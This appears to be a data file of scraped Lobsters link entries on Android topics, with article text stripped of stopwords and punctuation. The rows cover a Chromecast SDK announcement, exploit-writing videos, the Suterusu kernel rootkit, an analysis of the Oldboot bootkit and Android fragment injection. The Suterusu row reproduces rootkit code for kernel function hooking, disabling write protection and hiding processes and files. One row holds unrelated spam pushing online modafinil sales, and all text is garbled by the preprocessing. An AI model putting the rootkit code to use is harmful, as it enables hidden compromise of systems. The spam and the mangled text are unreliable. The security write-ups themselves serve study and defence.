527,Lobsters,android,Android,Ready to cast: Chromecast now open to developers with the Google Cast SDK,http://googledevelopers.blogspot.com/2014/02/ready-to-cast-chromecast-now-open-to.html,ready cast chromecast open developer google cast sdk,,blog latest news update story developer
528,Lobsters,android,Android,Swordfish: The Exploit Video Series,https://lists.immunityinc.com/pipermail/dailydave/2014-January/000566.html,swordfish exploit video series,dailydave swordfish exploit video series dave immunityinccom http wwwinfiltrateconcom http wwwyoutubecomwatch http http wwwyoutubecomwatch http wwwyoutubecomwatch http wwwyoutubecomwatch http wwwyoutubecomwatch vkpsudcebelc http wwwyoutubecomwatch vtaxrrsjpuqw http wwwyoutubecomwatch http wwwyoutubecomwatch http wwwyoutubecomwatch http wwwyoutubecomwatch vtnntfclnei http wwwyoutubecomwatch http http information dailydave mailing list,dailydave swordfish exploit video series dave aitel dave immunityinccom mon jan est past month writing exploit silica think make big impact user android vulnerability background also videoing various part exploit come together one thing always ask people infiltrate http wwwinfiltrateconcom show thing tried failed people ca nt really even remember process let alone document viewer course popular medium implies write remote exploit gun head http wwwyoutubecomwatch sixty second le decided change video small snapshot exploit come together bit bit interesting want know exploit course also interesting want learn kind work process go exploit nature unedited video tell sometimes turn sound way hear mark promise worth deep vulnerability beginning anyone written exploit tell background http initial vulnerability exploration optimism swordfish http wwwyoutubecomwatch swordfish http wwwyoutubecomwatch swordfish http wwwyoutubecomwatch swordfish http wwwyoutubecomwatch vkpsudcebelc swordfish http wwwyoutubecomwatch vtaxrrsjpuqw trying make exploit universal vulnerable apps hope working irl swordfish http wwwyoutubecomwatch swordfish http wwwyoutubecomwatch basically running unseen issue swordfish http wwwyoutubecomwatch solving issue running issue trying get work android version one longer turn sound phone video unfortunately swordfish http wwwyoutubecomwatch vtnntfclnei brief interlude swordfish part http wwwyoutubecomwatch course sign infiltrate send dave next part html attachment scrubbed url http next part nontext attachment scrubbed name signatureasc type applicationpgpsignature size byte desc openpgp digital signature url http information dailydave mailing list
529,Lobsters,android,Android,Suterusu Rootkit: Inline Kernel Function Hooking on x86 and ARM,http://poppopret.org/2013/01/07/suterusu-rootkit-inline-kernel-function-hooking-on-x86-and-arm/,suterusu rootkit inline kernel function hooking arm,table content introduction http githubcommncoppolasuterusu packetstormorg least look function hooking suterusu function hooking write protection control register pax project blog post dan rosenberg function hooking arm instruction caching arm official arm technical reference pro con inline hooking pro pro api hooking demystified pro dmtcp northeastern hpc lab con con api hooking demystified hiding process file directory,table content introduction number month ago added new project redmine tracker github showcasing code worked summer http githubcommncoppolasuterusu various router persistence kernel exploitation adventure taken recent interest linux kernel rootkits make tick searching around mainly packetstormorg archive whatever blog turned surprise really much found realm modern public linux rootkits prominent result centered around adoreng updated since least look miscellaneous name like suckit kbeast phalanx lot change kernel year year hoping something little recent like project said screw opened vim write rootkit designed work modern system architecture learn work act like formally introduce suterusu personal kernel rootkit project targeting linux arm lot talk way technique design implementation start basic suterusu currently sport large array feature many staging may appropriate devote separate blog post function hooking suterusu rootkits traditionally perform system call hooking swapping function pointer system call table technique well known trivially detectable intelligent rootkit detector instead pursuing route suterusu utilizes different technique performs hooking modifying prologue target function transfer execution replacement routine observed examining following four function hijackstart hijackpause hijackresume hijackstop function track hook linked list symhook structs defined struct symhook void addr unsigned char ocode hijacksize unsigned char ncode hijacksize struct listhead list listhead hookedsyms fully understand hooking process let step code function hooking weight carried hijackstart function take argument pointer target routine hookwith routine void hijackstart void target void new struct symhook sa unsigned char ocode hijacksize ncode hijacksize unsigned long push addr ret memcpy ncode hijacksize unsigned long ncode unsigned long new memcpy ocode target hijacksize disablewp memcpy target ncode hijacksize restorewp sa kmalloc sizeof sa gfpkernel sa return sa addr target memcpy sa ocode ocode hijacksize memcpy sa ncode ncode hijacksize listadd sa list hookedsyms smallsized shellcode buffer initialized push dword ret sequence pushed value patched pointer hookwith function hijacksize number byte equivalent size shellcode copied target function prologue overwritten patched shellcode point function call target function redirect hookwith function final step store target function pointer original code hook code linked list hook thus completing operation remaining hijack function operate linked list hijackpause uninstalls desired hook temporarily void hijackpause void target struct symhook sa listforeachentry sa hookedsyms list target sa addr unsigned long disablewp memcpy target sa ocode hijacksize restorewp hijackresume reinstalls hook void hijackresume void target struct symhook sa listforeachentry sa hookedsyms list target sa addr unsigned long disablewp memcpy target sa ncode hijacksize restorewp hijackstop uninstalls hook deletes linked list void hijackstop void target struct symhook sa listforeachentry sa hookedsyms list target sa addr unsigned long disablewp memcpy target sa ocode hijacksize restorewp listdel sa list kfree sa break write protection since kernel text page marked readonly attempting overwrite function prologue region memory produce kernel oops protection may trivially circumvented however setting wp bit register disabling write protection cpu wikipedia article control register confirms property bit name full name description wp write protect determines whether cpu write page marked readonly wp bit need set reset multiple point code make programmatic sense abstract operation following code originates pax project specifically nativepaxopenkernel nativepaxclosekernel routine extra caution taken prevent potential race condition caused unlucky scheduling smp system explained blog post dan rosenberg inline unsigned long disablewp void unsigned long preemptdisable barrier return inline void restorewp unsigned long barrier preemptenablenoresched function hooking arm number significant change exist hijack set hooking routine depending whether code compiled arm instance concept wp bit exist arm special care must taken handle data instruction caching introduced architecture concept data instruction caching exist architecture feature pose obstacle development modified address new architectural characteristic version hijackstart specific arm void hijackstart void target void new struct symhook sa unsigned char ocode hijacksize ncode hijacksize unsigned long target ldr pc pc long addr long addr memcpy ncode hijacksize unsigned long ncode unsigned long new unsigned long ncode unsigned long new else thumb add pc ldr mov pc mov pc long addr memcpy ncode hijacksize unsigned long ncode unsigned long new target memcpy ocode target hijacksize memcpy target ncode hijacksize cacheflush target hijacksize sa kmalloc sizeof sa gfpkernel sa return sa addr target memcpy sa ocode ocode hijacksize memcpy sa ncode ncode hijacksize listadd sa list hookedsyms displayed shellcodes arm thumb included redirect execution similar instruction caching arm android device enforce readonly kernel page permission least forego potential voodoo magic write protected memory region still necessary however consider concept instruction caching arm performing function hook arm cpu utilize data cache instruction cache performance benefit however modifying code inplace may cause instruction cache become incoherent actual instruction memory according official arm technical reference issue becomes readily apparent developing selfmodifying code solution simply flush instruction cache whenever modification kernel text made accomplished call kernel routine flushicacherange void cacheflush void begin unsigned long size flushicacherange unsigned long begin unsigned long begin size pro con inline hooking technique inline function hooking present various benefit detriment compared simply hijacking system call table pro function may hijacked system call pro le commonly implemented rootkits le likely detected rootkit detector also easy circumvent simple hook detection engine due flexibility assembly language variety detection evasion technique may found article api hooking demystified pro inline function hooking may applied userland minimalno modification working android port dmtcp application checkpointing tool northeastern hpc lab possible simply copy paste entirety hijack routine modified use userland linked list con current hooking implementation threadsafe temporarily unhooking function via hijackpause race window opened thread execute unhooked function hijackresume called potential solution include crafty use locking permanently hijacking target function inserting extra logic within hookwith routine however latter option special care must taken executing original function prologue architecture characterized variablelength instruction pciprelative addressing arm con another harmful possibility current implementation hook recursion moreso issue poor implementation insurmountable design flaw various easy solution problem hookwith function accidentally call hooked function leading infinite recursion great information topic proof concept code found article api hooking demystified hiding process file directory reliable hooking framework implemented fairly trivial start intercepting interesting function interesting thing one basic thing rootkit must hide process filesystem object may accomplished basic technique linux kernel one instance fileoperations struct associated supported filesystem usually one instance file one directory dig kernel source code find filesystems certain kind special structs contain pointer routine associated different file operation instance reading writing mmap ing modifying permission etc explicatory purpose examine instantiation fileoperations struct directory object const struct fileoperations llseek genericfilellseek read genericreaddir readdir unlockedioctl ifdef configcompat compatioctl endif fsync release hide object filesystem possible simply hook readdir function filter undesired item output maintain level system agnosticism suterusu dynamically obtains pointer filesystem active readdir routine navigating target object file struct void getvfsreaddir const char path void ret struct file filep filep filpopen path ordonly null return null ret filep fop readdir filpclose filep return ret actual hook process hiding item proc look like linuxversioncode kernelversion procreaddir getvfsreaddir proc endif hijackstart procreaddir nprocreaddir kernel version check response change implemented version remove exported procreaddir symbol includelinuxprocfsh previous version possible simply retrieve pointer value externally upon linking rootkit developer forced obtain alternate manual mean perform actual hiding object proc suterusu hook procreaddir following routine static int oprocfilldir void buf const char name int namelen lofft offset ino unsigned dtype int nprocreaddir struct file file void dirent filldirt filldir int ret oprocfilldir filldir hijackpause procreaddir ret procreaddir file dirent nprocfilldir hijackresume procreaddir return ret real heavy lifting occurs filldir function serf callback executed item directory replaced malicious nprocfilldir function follows static int nprocfilldir void buf const char name int namelen lofft offset ino unsigned dtype struct hiddenproc hp char endp long pid pid simplestrtol name endp listforeachentry hp hiddenprocs list pid hp pid return return oprocfilldir buf name namelen offset ino dtype since intention hide process hijacking readdirfilldir routine proc suterusu simply performs match object name linked list pid user wish hide match found callback return item hidden directory listing otherwise original procfilldir function executed value returned concept applies hiding file directory except direct string match object name performed instead converting pid name number type first static int nrootfilldir void buf const char name int namelen lofft offset ino unsigned dtype struct hiddenfile hf listforeachentry hf hiddenfiles list strcmp name hf name return return orootfilldir buf name namelen offset ino dtype
531,Lobsters,android,Android,Oldboot: the first bootkit on Android,http://blogs.360.cn/360mobile/2014/01/17/oldboot-the-first-bootkit-on-android/,oldboot first bootkit android,download construction behavior oldboot android process system new infection method related sample solution http discussion xiaozihang,qihoo technology co ltd nyse qihu zihang xiao qing dong hao zhang xuxian jiang jan day ago found android trojan using brand new method modify device boot partition booting script file launch system service extract malicious application early stage system booting due special ram disk feature android device boot partition current mobile antivirus product world completely remove trojan effectively repair system named android trojan family oldboot far know first bootkit found android platform wild according statistic today android device infected bootkit china last six month released new security tool download accurately detect defines construction behavior oldboot android device infected oldboot user find new application contain lot advertisement frequently installed system installed application list user find system application named googlekernel uninstalled manually antivirus product mobile security classify application malware figure however removing rebooting device two previous phenomenon occur oldboot constituted four executable configuration file initrc configuration script android system booting modified oldboot sbinimeichk elf executable file arm architecture systemappgooglekernelapk android application installed system application systemliblibgooglekernelso native library used googlekernel figure antivirus product classify googlekernel malware four file complex calling relationship figure android system booting read initrc launch imeichk system service open related local socket imeichk extract libgooglekernelso systemlib imeichk also extract googlekernelapk systemapp system booting finished googlekernelapk installed system application periodically execute native code libgooglekernelso trigger malicious behavior libgooglekernelso generate configuration malicious command pas java code googlekernelapk googlekernelapk sends command imeichk socket command executed imeichk last figure component oldboot relationship detailed analysis file tail initrc content found line service imeichk sbinimeichk class core socket imeichk stream according android system booting init process launch new system service named imeichk root permission create local socket name creating socket listening imeichk execute code read two data block readonly data segment extract two file figure systemliblibgooglekernelso systemappgooglekernelapk figure imeichk extract apk file side imeichk create socket receive coming data data parsed linux system command executed root permission last figure figure imeichk receives command executes infected device found imeichk socket running root permission listening receive data process please note access property socket device setuid flag figure worldwritable property lead serious security vulnerability infected device application send socket device linux command executed root permission later figure imeichk socket device written process android system booting check whether apk file systemapp installed installed system application called preinstalled application thus googlekernelapk installed system application libgooglekernelso reliant native library extracted correct place removing normal android malware previous android antivirus product uninstall delete malicious apk file thus device rebooting undeleted imeichk extract googlekernelapk fact antivirus product also effectively remove imeichk discus later let deeper look googlekernelapk declares many system dangerous level permission androidmanifestxml specifies running system user application android allowbackup true android allowclearuserdata false android killafterrestore false android label googlekernel android persistent true android process system application one service named dalvik two receiver named bootrecvand eventsrecv without activity well user interface main behavior include collecting system information changing network setting periodically triggering malicious behavior connecting c c server figure download configuration file connecting c c server get back system command executing root permission downloading apk file figure installing system application figure uninstalling specified system application unfinished function name seems author oldboot planning implement sending sm specified phone number figure figure libgooglekernelso store c c server url global config figure libgooglekernelso downloads apk file install figure downloaded apk file installed system application figure libgooglekernelso try send sm related java code finished author oldboot intentionally designed malicious behavior implementation main malicious behavior split many different execute phase implemented different component googlekernelapk periodically activate call jni interface file trigger malicious behavior phase behavior connect c c server file construct server url call java code apk file jni phase apk file start http connection server return request result file phase file par result format get command configuration data phase behavior install apk file uninstall system application downloading apk file phase file construct system command including remount system partition pm installuninstall installation uninstallation pas apk file jni phase apk file send command imeichk service local socket phase see figure figure last imeichk execute command root permission phase figure googlekernelapk initializes connection local socket imeichk figure googlekernelapk send system command socket new infection method differ previous malware android main specialty oldboot modification initrc file sbin directory android root directory sbin directory locate ram disk loaded boot partition device disk ram disk readonly inmemory file system runtime changing never physically written back disk thus system running even remount partition writeable delete file directory deleting operation really apply disk device rebooting file appear previous android malware droidkungfu may extract malicious file system partition system partition feature mean technical difficult malware file writing antivirus file deleting however facing oldboot even antivirus product know imeichk malicious need deleted really completely delete previous traditional method since remount method delete copy sbinimeichk memory affect disk partition problem attacker put imeichk sbin directory successfully modified initrc script believe least two way achieve attacker chance physically touch device flash malcious bootimg image file boot partition disk system running gaining root permission forcibly write malicious file boot partition dd utility oldboot case likely believe attacker chose first way still exclude possibility second one reason firstly found infected device bought big mall zhongguancun famous biggest consumer electronics distributing center beijing past found retailer flashing system image contain malware mobile phone tablet selling secondly infected device galaxy note ii contains samsung stock system normal system application samsung official signature however recovery partition replaced thirdparty recovery rom timestamp file boot partition thirdly based qihoo cloud security technology counted model known infected device half wellknown popular model attacker used second way infect device remotely attack target randomly control distributed close real market distribution android device related sample apk file extracted oldboot us selfsigned certification found two malware used certification first malware disguise normal security application dynamically register contentobserver observe change sm inbox every time new sm coming check content contains word qq number password chinese figure word exist delete sm upload content specified severs past tencent provided service recover qq password sm thus malware steal user qq account time malware also us receiver service name oldboot apk file figure oldboot related sample steal qq password second related malware named googledalvik code structure including jni interface entry class almostly oldboot difference googledalvik googlekernelapk previous communicate imeichk socket installation uninstallation system application execute command java code figure figure difference oldboot previous version believe googledalvik earlier version oldboot version without bootkit component googledalvik oldboot use domain c c server url main reason named family oldboot solution released first special security tool oldboot download http tool deeply precisely scan android device find existence oldboot variant developed new defines method effectively disable malicious behaviour oldboot besides using security tool detect defines also suggest user checking tool updating regularly may add ability detect clean variant find oldboot phone please report phone information sample u help u lot also try reflash device origin stock rom flashing oldboot completely removed since modified device infect oldboot find tool also directly contact reseller take customer service also suggest install mobile security application using cloud detection ability protect mobile phone tablet discussion found oldboot famous android malware widely considered rootkit variant droidkungfu family gain root permission system vulnerability remount system partition replaces executable file rewrite system configuration file also try run malicious code early stage system booting prevent cleaned antivirus application however many difference droidkungfu oldboot firstly oldboot infection method simply remounting system partition changing file like droidkungfu physically operating device disk flash dd secondly oldboot removed repaired file system level droidkungfu last attack method exploit boot partition ram disk feature easily developed implement advanced file system level hidden believe oldboot creates totally new malware attack method android physically touch disk level operation android malware similarly write boot partition modify initrc script gain earlier launch priority high running permission avoid cleaned antivirus solution well effectively hide first found bootkit android oldboot symbolic significance closely follow development kind attack medium contact xiaozihang
533,Lobsters,android,Android,"Some of what we did at Danger (makers of the Sidekick, predecessor to Android)",https://medium.com/tech-talk/d823af31f7c,danger maker sidekick predecessor android,came catapult entertainment webtv general magic first peanut see portal yahoocom front page looked like back subcarrier ibeacon great music horrible data spot gprs pivoting pivoting thing hiptop hiptop feature alwayson twoway data ton input multiprotocol instant messaging copyright softbank multiaccount email pim apps web browser wap avantgo wwwapplecom great text text geek susan kare cloud storage web apps multitasking interapp communication app store speaking billing air update notification music general midi open sourced deaf community tcoils tdd developer program encryption blowfish twofish aes arm thing could io android internet archive wayback machine view old post telenav finally coolest thing never shipped,came across website whose purpose provide super detailed list every handheld computing environment going back early great job except one glaring omission first mobile platform helped develop company called danger platform called hiptop follows account early day list modern technology shipped year could buy io android devicewho came fromway back early new consumer electronics startup founded took residence palo alto california company name danger research inc three founder andy rubin matt hershenson joe britt apple alumnus involved several company apple danger general magic catapult entertainment webtv still always think apple guysanyway early cast danger largely apple webtv general magic one apple people joe invited lunch one finished eating casually mentioned andy started new company asked wanted job said yes without even asking company going figured would probably cool danger ended fun place ever worked cool known world chris dangercom first peanutyou see portalsthink back web browser year old parent probably email possibly cell phone yet almost one broadband commercial web monolithic site visit read mail view calendar check headline news etc one place internet abuzz idea merging big medium web stuff costly needed keep eyeball site much possible new thing could tack onto site keep little longer fair gamei started danger april like shock take look yahoocom front page looked like back actually shock little changed huge problem facing portal developer access user desktop computer often work general purpose connected mobile computer well super costly aimed enterprise user exist help mom check online todo list line grocery danger original product idea aimed solve problemwe codenamed peanut possibly shaped like nutter butter cookie keychain fob small lcd display button idea would oneway data device would hold important bit info portal account time todo list calendar recent email etc plan sell enduser peanut charge portal monthly fee run service would tie portal data user device cool new valueadd seemed like something portal would want since would bind user portal even tightlywe two method getting data onto peanut first involved placing peanut dock connected serial port going special web page would talk custom browser plugin originally worked pull data store peanut crazy demo favorite involved ad data downloaded would show ad plugin frame browser window also show complementary animated ad peanut lcd screen data sync something expected per day get big data movement donethe second method send data fm radio subcarrier plan lease bandwidth radio station every major metropolitan market could receive fm radio could get data technology obviously oneway send much data one time intended small incremental update throughout daywe actually got stuff working fact used fm radio transmit data opened interesting possibility one idea retailer could buy small super lowpower fm transmitter connected network serve targeted reward special liked talk folk walking past starbucks peanut go ding looking seeing received coupon good next minute although never developed part product concept life known ibeacongreat music horrible datathere lot problem using fm radio delivery biggest trying convince radio station let u attach manage gear system going take really long time would kind serious coverage big hurdle figuring broadcast data signed service get zip code broadcast data primarily nearest transmitter traveled worked insane system slowly propagating change market area hope catching moved around anyway turned really bad idea microsoft fossil several watchmaker would launch nearly identical product called spot dismal failure shut year later right time vc partner ran number came great idea backofthenapkin math showed cost building maintaining doomed nationwide fm data network could instead r twoway data device hosted gsm cellular network data service network called gprs bleeding edge stuff time awesome prior gprs mostly restricted using pager network vc partner even found u data provider looking device showcase small regional carrier pacific northwest spun western wireless voicestream would later get acquired deutsche telekom act management data product division would eventually renamed tmobilepivoting pivoting thingso dropped peanut started development new thing exactly sure going knew wanted one since really anything marketplace model built thing wanted hope people would share enthusiasm want one toohiptopwe called device hiptop though tmobile sold u sidekick first alwayson internetconnected smartphone name hiptop came idea wear belt holster thus computing gone desktop laptop palmtop ultimately hiptop justification may invented fact whatever great namethe bleeding edge twoway data time started great pager bring anyone joythe featuresthe product time anything even remotely like thinking early blackberry worked pager network required attaching special hardware rim setup sold solely enterprise anything wanted spent time thinking want entirely staffed earlyadopter type wired long meaning adjective clearly going focused around electronic communication personal data management since u also going nonenterpriseearly hiptop prototype called paperback alwayson twoway day wireless pda made go transmission mode sync hiptop always connected data could pushed device service time device could respond immediately huge leap forward lost connectivity apps would queue activity outbound email calendar change etc process instant got network connection none pulltorefresh taptoretry crutch vogue day network connection data fresh user work make brief aside world owes debt thanks jeff bush first person know get full tcpip stack working cellular data connection hiptop magic happened without jeff would later move work apple palmtons power user desktop computer wanted lot input lot way tie together extra stuff roller controller also main action button later replaced trackball dpad game three button corner face device menu jump cancel also full qwerty keyboard dedicated number row could chord menu button keyboard key perform menu action cutcopypaste etc jump button quickly switch apps later add two topedge shoulder button ok button dedicated button answering hanging phone call written like sound like lot quickly got used allowed lot complicated action without ever look screenanother early prototype called navi multiprotocol instant included im client aol instant messenger yahoo messenger msn messenger jabber support early technology google talk based never shipped recall could chat going use shoulder button rotate chord menu button number row keyboard jump directly specific chat supported graphical emoticon everything use full set emoji image back still copyright softbank japan pretty good coverage smiley people usedmultiaccount supported pop imap got builtin email account signed service could link three external account email supported rich text convert incoming html mail simplified form display handled bold italic etc quite well image attachment including ability send email attachment apps device first model mb storage keep mail hiptop got low space start dumping bit piece message went read later bring piece back ondemand networkpim pim still term people use personal information manager well anyway pim apps note pad todo list address book calendar exactly expect say though calendar app handled multitimezone repeating event way better anything else thereweb saved app last huge undertaking time device idea let user access internet provide wap browser super crappy textonly walled garden based text message allowed view entire world wide webthe magic behind technology licensed avantgo big bank web proxy server sitting hiptop browser internet requested page would fetched one special proxy ran heavily modified version mozilla browser fully rendered measured converted highlycompressed list display element hiptop browser put screen would fetch resize recompress image would convert text character encoding thing natively support lot magic could still use web form stuff super complicated difficult modify amazingly wellsuited serving type web page common browser innovation let leave www com url entered browser type apple would go wwwapplecom exactly want nearly every time enter single word one many case said really bug x would make version bug usgreat text geek know happened turned hiptop amazing text insane amount work shape key keyboard could easily type without looking experienced user easily touchtyped wordsperminute zero error silicone keycaps unique key shape amazing typing user hesitate use im hour straight compose email thousand word long wrote first version text editor baked text feature loved much beloved macintosh software selection cursor movement deletion back forward page updown homeend worked exactly expected initially handcrafted bitmap font designed susan kare previously done original macintosh font icon device showing horrible dotmatrix block letter lovely proportional font system looked greatsince platform unicodebased could handle ton nonenglish language know thing hold letter iphone android keyboard pop list extended option year earlierok maybe took little far showing unicode code point character hexadecimal alternate input method would allow type character little far nerd spectrumcloud iphone data backed icloud android data google service super cool great today user year research shown plug phone manually sync fewer user ever automagic great early folk come webtv year already natural u well everything hiptop immediately communicated server backed multiple device attached account change instantly distributed deviceswe demo trade show someone audience give u quote presenter typed quote hiptop put ground dropped bowling ball hiptop destroyed removed sim card plugged another hiptop signed account second later note app quote fully restored much applauseweb backup data could neat stuff one provided web interface email pim apps photo galleryi find color screenshot design think hold pretty wellthis turned surprisingly big deal remember early data commercial cellular brand new place outside u traveled overseas likely data coverage able access data via desktop browser invaluablealong enabling web apps cloud storage also meant could provide way sync data across service sync product big market category back added way product talk service behalf sync data related apps desktop computer outlook lotus note etc multitasking interapp launched app stayed running time fact application framework even provide way app quit everything always stayed running meant could stuff like web browser start loading really big page switch read email reply ims note lunch date calendar pop back web browser page loaded would alert finished apps talked example could select anything notestodocalendaretc apps hit menum would start new email item data menum web browser would start new email url page looking atany place drew text would highlight email web url make selectable could download file web browser store sd card forward apps viewing editing many way apps cooperated wellapp tmobile inexplicably called download fun hiptop offered online app store category apps game utility seasonal stuff trending product ringtones wallpaper could browse whole catalog online see screenshots detailed description etc ringtone could play sample clicked buy button downloaded installed instantly charge added phone bill credit card extra account nothing oneclick purchasing simplest billing ever also offered hour return policy deleted app within hour billed great apple launch app store io cost hiptop service per month top whatever voice plan carrier cheap easy understand haggling deciding data cap choose granted virtue network back used tiny fraction data today phone use still time flatrate data billing novel prouserover air would need able fix bug add new feature existing device added ability hiptop software wirelessly upgraded cell network would happen background get notification telling update asking reboot could defer wanted io add capability late full year itnotifications area hiptop really shone multimedia playback rgb led device could light color also vibrator finegrained control enabled u thing still one matched one ringtone format option enhanced version general midi multicolor led vibrator midi instrument system could really amazing music synchronized colored light vibration folk published amazing professionally engineered ringtones platformwhen screen turned led would periodically blink let know notification waiting could choose color flashing pattern wanted app instance hiptop knew yellow meant unread ims blue meant email purple calendar red web page loading etc could glance hiptop across room know going onwe also mode music playback system analyze music waveform pulse vibrator match bass line music added bit lowend oomph surprisingly effective game made great use vibrator toothe amazing audio engine hiptop ton thing used well engine open sourcedthe deaf communityone thing really surprised u hiptop popular deaf community two reason behind thisthe first cellular radio chipset used phone portion device happened compatible tcoils telecoils special circuit allow phone used hearing aid cochlear implant without causing electromagnetic interference today still cell phone market hearing aid compatible virtually none werethe second reason deaf hard hearing user loved u included ttytdd application free starting hiptop ii prior deaf person wanted communicate hearing person phone would connect phone handset special modem hearing person would speak operator would type deaf person would read typing type back assumed device small sexy imagine deaf folk left home timea typical ttytdd terminal around also make sure access handset right shape acoustic coupler ugh hiptop could get functionality without extra hardware tdd software based built suddenly deaf hard hearing user could communicate hearing user anywhere anytime cell phone deaf user letter thanks received office would break heart read tmobile great thing offered dataonly pricing plan deaf user since use voice minute official asl sign hiptop find ttytdd support current smartphone developer programwe knew thirdparty application especially game would crucial success platform way write sell apps listed app store platform javabased meant huge host free tool available platform wanted tool provided packing testing submitting application also javabased could write hiptop apps mac o window linux whatever interesting historical side note engineer developed java runtime hiptop would later join google lead android kernel engineering team develop dalvik java language runtime androidwe provided outstanding device simulator let test everything could even simulate camera hardware could simulate poor network condition see app would behave lot neat stuffone aspect developer program remains unique level testing thirdparty app submission army extremely skilled software qa folk would give submission hour testing app rejected mystery provided multihundred item checklist test performing developer could testing thing would check sense confidence product submitted cost u lot manpower think better developer experience see android zero testing ton malware io testing visibility process one apps app store ssh client developed inhouse led hiptop becoming wildly popular folk since could use im client chat folk back office problem use ssh client remotely administer machinesanother aside one favorite danger story time one server engineer stuck airport waiting delayed flight noticed problem aol instant messenger proxy used ssh client remotely connect computer office coded fix kicked build pushed productionencryptionsecurity privacy pretty hot topic day remember came decided communication hiptop server encrypted used either blowfish twofish bit key cipher though later switched aes ratified crypto requires lot hard math operation performed large number original hiptop mhz processor quickly found implementing crypto java application layer would require minute thing like validating certificate ssh handshake stuff written handcrafted arm assembly engineer told great story go used bookstore find book numerical method originally written slide rule calculation said done could validate certificate five secondsa thing could io find friend foursquare app called dog would show map hiptopconnected friend phone gps back determined location based cell tower connected super accurate good enough one engineer also made cool app let leave locationbased note standing right place could see note otherwise started microblogginglifestreaming device camera network connection email app tied together procmail filter perl script would generate web page employee started chronicling life later turned service replacing perl python email text photo hiplogs hiptopcom get added hosted blog zero setup picked account name device tumblr instagram rolled one simpler use neat use internet archive wayback machine view old support bluetooth headset audio system car always sort surprised amazing deal bizdev folk managed one getting dedicated native facebook twitter myspace client platform recently learned offered mappingroutinglive traffic app created telenav screenshots look like pretty telenavand finally coolest thing never shippedin skunkworks project within danger merge color gameboy called hiptop color screen manufactured sharp happened one used gameboy advance common component well figured virtually hardware handheld game player play game prototype board photo courtesy ficuswe extracted gameboy advance chipset built backside hiptop main board developed custom chip would let u mix video signal gameboy hiptop perpixel basis could decide show screen made hiptop software would let u start stop gameboy playpause game etc gameboy input came hiptop dpad four corner buttonsthis let u following demo start gameboy game watching regular gameboy video receive phone call gameboy game would magically pause hiptop alert window would display top gameboy video asking wanted answer call soon call game would resumesince network app store seemed like great way distribute gameboy rom got working could browse gameboy game app store pick one buy download playing second need haul cartridge around youthe executive nintendo blown away absolutely loved license game catalog include right electronic distribution coupled need take new screenshots write new catalog copy electronic format determine pricing etc meant way could gotten big enough catalog title built time christmas year next window would graduation season following year whole project fizzled died damn coolupdated january photo prototype added encryption section
534,Lobsters,android,Android,The Need for an Open Barcode Database,http://kyleconroy.com/open-barcode-database,need open barcode database,global trade item number gtin global electronic party information registry gepir daily click open data common open database license cuecat,next time store grab random product look turn around probably see one encoded bar code product global trade item number gtin digit long almost every product sold world one number managed nonprofit organization manages standard supply chain provides control global electronic party information registry gepir authoritative source gtins two interface gepir web portal soap web service restrict user daily request option download dataset submit missing item number correct inaccuracy compare openstreetmaps download entire map earth single click add missing building using webbased editor first person realize bad situation option none open database needed option closed gepir last service list pod interest almost million indexed item free dump data data licensed open data common open database license license open street map issue pod nt support crowdsourcing data think openstreetmaps solved problem right way get people contributing data make data available open license idea application let scan bar code upload gtins product nt database attach photo add short description database small first hundred people start tagging next cuecat
536,Lobsters,android,Android,AnthraX Linux Kernels Remain Closed Source,http://www.phoronix.com/scan.php?page=news_item&px=MTU1ODA,anthrax linux kernel remain closed source,gplviolationsorg new kernel mailing list thread,anthrax kernel used mobile android device alternative stock kernel opensource android project reportedly offering better performance functionality still refusing release kernel sourcecode even though based linux kernel subject term gpl anthrax kernel developer still thwart gpl license linux kernel requiring user signup download kernel authorized download file widely releasing anthrax kernel public trying make private organization internally distributing compiled kernel binary via project website go without releasing kernel sourcecode claiming gpl compliance technically nt distributing compiled kernel issue brought month prior gplviolationsorg avail lead anthrax developer nt want give kernel source code reportedly concern developer taking credit improvement work kernel also claim kernel incorporate code nda vendor eric appleman opensource developer long crusading project pointed new kernel mailing list thread week anthrax developer still proceeding without providing sourcecode private kernel also link mailing list thread recent google post interested light reading holiday week
537,Lobsters,android,Android,Telegram Messenger For iPhone And Android (oss),http://telegram.org/,telegram messenger iphone android os,,requested url blocked per direction received department telecommunication government india
538,Lobsters,android,Android,Infographic: Global Cell Phone Statistics,http://www.longren.org/infographic-global-cell-phone-statistics/,infographic global cell phone statistic,read,modafinil medication used treat sleepiness caused narcolepsy may experiencing sleep disorder due shift work lead interruption sleep different time medication developed help management obstructive sleep apnea necessary enough sleep body read morebuy modafinil online trusted source
539,Lobsters,android,Android,A New Vulnerability in the Android Framework: Fragment Injection,http://securityintelligence.com/new-vulnerability-android-framework-fragment-injection/#,new vulnerability android framework fragment injection,broken whitepaper ui building block android apps activity fragment android sandboxing permission interapp communication attack malicious apps intent bundle applicationmanifestxml preferenceactivity preferenceactivity preferencefragment fragmentinstantiate vulnerability whitepaper attacking android setting fix sdk reference vulnerable version nonvulnerable version disclosure timeline ibm application security research team,recently disclosed new vulnerability android security team vulnerability affected many apps including setting one found every android device gmail google dropbox evernote accurate app extended preferenceactivity class using exported activity automatically vulnerable patch provided android kitkat wondered code broken due android kitkat patch requires application override new method preferenceactivityisvalidfragment added android framework blog post begin short introduction android sandbox deepdive vulnerability sake simplicity omitted detail found whitepaper ui building block android apps ui android apps made activity activity provides single screen functionality instance browser bookmark manager fragment considered subactivity piece app ui fragment provide flexibility allow reuse different activity fragment instance coupled activity resides inside different instance embedded different activity see figure relation activity fragment figure relation activity fragment android sandboxing permission interapp communication attack malicious apps android apps isolated subject declared set permission use sandboxing app normally access sensitive data another said possible one app invoke application component activity another app feature reuse example chrome invokes google play app opening google play url invocation done using intent ipc object source application pass corresponding api intent specify target also contain data two place first location data attribute uri type second one dictionary bundle contain arbitrary amount information also known intent extra activity invoked external app exported application manifest file applicationmanifestxml making activity public exported creates potential hole android sandbox since activity access input intent data bad app invoke exported activity provide malicious data may trigger vulnerability data properly santizied validated target application fragment receive input accessing embedding activity thus input intent fragmentspecific argument see figure attack outline figure attacking exported activity preferenceactivity preferenceactivity base class provided android framework showing hierarchy preference user preference associated preferencefragment preferenceactivity consumes intent extra one android showfragment tell preferenceactivity fragment display first dynamic fragment loading done chain call start activity creation end fragmentinstantiate see figure latter load fragment using java reflection api override protected void oncreate bundle savedinstancestate superoncreate savedinstancestate string initialfragment getintent getstringextra extrashowfragment bundle initialarguments getintent getbundleextra extrashowfragmentarguments savedinstancestate null else initialfragment null msinglepane showing fragment want run new fragment mode nt need compute show header switchtoheader initialfragment initialarguments else mheaderssize msinglepane initialfragment null else switchtoheader initialfragment initialarguments public void switchtoheader string fragmentname bundle args setselectedheader null switchtoheaderinner fragmentname args private void 